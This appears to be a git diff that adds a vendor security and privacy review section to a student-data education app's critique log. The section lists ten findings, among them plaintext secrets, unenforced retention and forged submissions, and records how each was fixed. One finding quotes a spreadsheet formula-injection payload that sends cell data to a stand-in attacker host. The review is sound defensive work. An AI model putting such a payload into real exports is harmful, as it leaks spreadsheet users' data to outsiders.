@@ -158,3 +158,36 @@ against the running app.
 | Claim | Source | Why not |
 | --- | --- | --- |
 | `SETUP_SELECTED`, `POPUP_SPOT_SELECTED`, `COURSE_DEPOSIT_DECIDED` and the other consequential decisions "are graded nowhere". | density | Half accepted. They are deliberately not tagged: `eventConcepts.ts` only names a requirement the world's observer actually produces, and `evidenceEnvelope.test.ts` fails if a tag appears that nothing can observe. Which place Avery lives in is a preference the balance harness proves has no dominant answer, and grading a preference is grading taste. What *is* judged is whether the plan that follows the choice works, and what the student says about it. The half that stands: the **consequences** of those choices must reach a requirement, and where a decision has a right answer available — the need/want/committed sort in J2's replacement — it should produce one. |
+
+
+## L · The vendor review — what a district would refuse to deploy
+
+A security and privacy red team ran a private copy of the shipped server against the file
+store, attacked every route, read the whole server and the front-end fetch and render paths,
+and researched the live text of FERPA §99.31, the April-2025 COPPA Rule, NY Education Law §2-d
+and 8 NYCRR Part 121. Its verdict: **DEPLOY WITH CONDITIONS**, with an explicit carve-out to
+**REFUSE the self-hosted file-store configuration** until it encrypted at rest and deleted at
+the retention horizon. Full report: `gauntlet/critiques/vendor-review.md`.
+
+| # | Sev | Defect | State |
+| --- | --- | --- | --- |
+| L1 | BLOCKER | **Children's names, every class's teacher key, and the HMAC secret that signs every session token, in plaintext on disk.** One disk image, one stray backup, one restored volume: every class's names and evidence, plus the ability to mint a valid token for anybody in the deployment. Nothing between "read a file" and "own the district". | **Closed** — every durable write is AES-256-GCM sealed, the signing secret is derived from the operator's key and written nowhere, and a disk store with no key refuses to start. Proved against the bytes on disk, not against the store's interface. |
+| L2 | MAJOR | **"Kept for 120 days, then deleted" was executed by nothing.** `deleteClass` had one caller — the manual route. Reads gated on `expiresAt` and answered 404, so expired data was hidden, not deleted, and a self-hosted district accumulated children's names for ever while the product said it did not. | **Closed** — an hourly sweep on a long-running server, an opportunistic one on serverless, and `GET /health` reports when it last ran and what it removed. |
+| L3 | MAJOR | **No per-student deletion.** Removing a seat is a tombstone that keeps the name and every row. A district could honour a parent's erasure request only by destroying the other twenty-nine students' work. | **Closed** — `DELETE /classes/:code/roster/:seat?erase=1`, and an **Erase** control on the class list that names the child and says it cannot be undone. |
+| L4 | MAJOR | The only third party that ever receives student data is the KV subprocessor, and that needs a DPA the repo cannot show. Hosting region, sub-processor agreement and at-rest attestation are contractual, not code. | **Open, and contractual.** Setting `BOW_STORE_KEY` on the managed path now means the subprocessor holds ciphertext, which changes the conversation but does not end it. |
+| L5 | MAJOR | **An open-join class accepted anonymous, forged evidence from the class code alone.** A `POST` with no session, `seatCode: "7"`, and a valid log returned `202` and appeared in the teacher's evidence room. | **Closed** — every submission requires a student session and a seat that account holds, in every class. The exception was written for classes created before accounts; the only door now issues a session on the open path too. |
+| L6 | MINOR | **Spreadsheet formula injection** through a student-typed display name into the gradebook export: `=HYPERLINK("http://evil.example/?"&A1,"grade")` reached a live cell. | **Closed** — a cell beginning `=`, `+`, `-` or `@` is prefixed. |
+| L7 | MINOR | **No CSP and no security headers** anywhere. React's escaping is what actually stops a stored name executing; nothing stopped the next mistake. | **Closed** — CSP, `nosniff`, `DENY`, `Referrer-Policy` and `no-store` on the API; the same plus HSTS and `frame-ancestors` as real headers from the host. Verified: zero violations across seven surfaces. |
+| L8 | MINOR | **The token-signing secret was minted from `Math.random()`** — the one generator this codebase had already replaced for class codes, still in use for the most important secret in the system. | **Closed** — derived from the store key, or `randomBytes(32)`. |
+| L9 | MINOR | **Self-hosted transit is plain HTTP with no TLS guidance.** | **Closed** — binds loopback by default, says so when opened wider, and the README states the requirement. |
+| L10 | MINOR | Deleting a class left orphaned account records. | **Closed** — a student account with no remaining seat goes with the class. |
+
+### What held up, and is worth writing down
+
+The reviewer could not reproduce any cross-student, cross-teacher or unauthenticated disclosure
+of a child's name or work. The whole `alg:none`/tamper/expiry family is rejected. The vendor's
+record of a student is `{id, createdAt}` — no email, no date of birth, no school, no device, no
+clickstream. The supply chain is four runtime dependencies with no analytics, no CDN, no web
+font and no tracker, and no student writing is sent to any model: zero outbound calls except
+this deployment's own API, enumerated. And the product does not claim FERPA, COPPA or §2-d
+compliance anywhere, which is the rule it set itself.
